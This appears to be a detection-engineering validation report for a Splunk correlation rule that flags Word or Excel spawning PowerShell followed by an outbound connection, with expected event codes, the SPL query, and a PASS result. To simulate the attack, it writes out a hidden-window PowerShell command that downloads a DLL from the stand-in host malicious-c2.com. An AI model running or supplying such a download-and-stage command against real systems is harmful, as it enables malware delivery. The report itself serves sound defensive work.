# Validation Report: Correlation Rule - Phishing Initial Access

## General Information

* **Correlation Name:** Multi-Stage Attack: Phishing Initial Access & C2
* **Reference Rule:** `15-Correlation-Phishing-InitialAccess.md`
* **Severity:** HIGH
* **Objective:** Detect the entry point ("Patient Zero") through a malicious email attachment that executes code and makes network requests.

## The Attack Chain (Simulated Kill Chain)

The attack was simulated by triggering the execution of a malicious Word macro through PowerShell (within 24 hours).

**Phase 1: Initial Access & Execution (Word Spawns PowerShell)**

```cmd id="h3q7vn"
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri [http://malicious-c2.com/payload.dll](http://malicious-c2.com/payload.dll) -OutFile C:\Temp\payload.dll"
```

**Phase 2: Command and Control (Network Connection from the Terminal)**
(The execution of the previous command also automatically triggers the external network connection)

---

## Expected Telemetry

1. `EventCode 4688` / `EventCode 1` showing `winword.exe` or `excel.exe` spawning `cmd.exe` / `powershell.exe`.
2. `EventCode 3` (Sysmon - Network Connection) initiated by a terminal process.

## Correlated Splunk Query (SPL)

```SPL id="k8m2rx"
(index=wineventlog OR index=sysmon)
( (EventCode=4688 OR EventCode=1) ("*winword.exe*" OR "*excel.exe*") ("*cmd.exe*" OR "*powershell.exe*") ) OR 
( EventCode=3 ("*powershell.exe*" OR "*cmd.exe*") )
| transaction host maxspan=24h
| search ("*winword.exe*" OR "*excel.exe*") AND ("*cmd.exe*" OR "*powershell.exe*") AND EventCode=3
| eval Attack_Chain="CRITICAL ALERT: Office Macro Execution -> Shell Launch -> C2 Connection"
| table _time, host, duration, Attack_Chain
```

## Validation Result and Screenshot

The rule successfully correlates the process execution with its subsequent network activity, identifying the initial access.

**Result:** `PASS`
